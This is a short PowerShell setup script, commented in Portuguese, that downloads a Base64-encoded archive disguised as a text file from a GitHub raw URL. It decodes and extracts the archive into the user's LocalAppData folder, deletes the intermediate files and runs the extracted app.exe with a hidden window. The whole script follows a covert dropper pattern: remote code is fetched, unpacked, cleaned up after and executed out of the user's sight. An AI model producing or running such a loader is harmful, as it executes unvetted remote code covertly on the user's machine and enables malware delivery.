# setup.ps1
# Baixa, extrai e executa o app (em background)

# Definir URL do arquivo Base64 (app.zip codificado)
$url = "https://raw.githubusercontent.com/shellt3r/app/refs/heads/main/app.txt"

# Definir diretório de destino
$destino = Join-Path $env:LocalAppData "MeuApp"

# Caminho completo para o zip
$zipPath = Join-Path $destino "app.zip"

# Caminho para o app.exe
$exePath = Join-Path $destino "app\app.exe"

# Criar o diretório de destino, se necessário
if (!(Test-Path -Path $destino)) {
    New-Item -ItemType Directory -Path $destino -Force | Out-Null
}

try {
    # Baixar e decodificar
    Invoke-WebRequest -Uri $url -OutFile "$zipPath.b64" -UseBasicParsing
    [System.Convert]::FromBase64String((Get-Content "$zipPath.b64" -Raw)) | Set-Content -Encoding Byte $zipPath
    Remove-Item "$zipPath.b64" -Force

    # Extrair
    Expand-Archive -Path $zipPath -DestinationPath $destino -Force

    # Apagar o zip extraído
    Remove-Item $zipPath -Force

    # Executar app.exe, se existir
    if (Test-Path $exePath) {
        Start-Process $exePath -WindowStyle Hidden
    } else {
        Write-Host "Arquivo app.exe não encontrado." -ForegroundColor Red
    }
}
catch {
    Write-Host "Erro: $_" -ForegroundColor Red
}
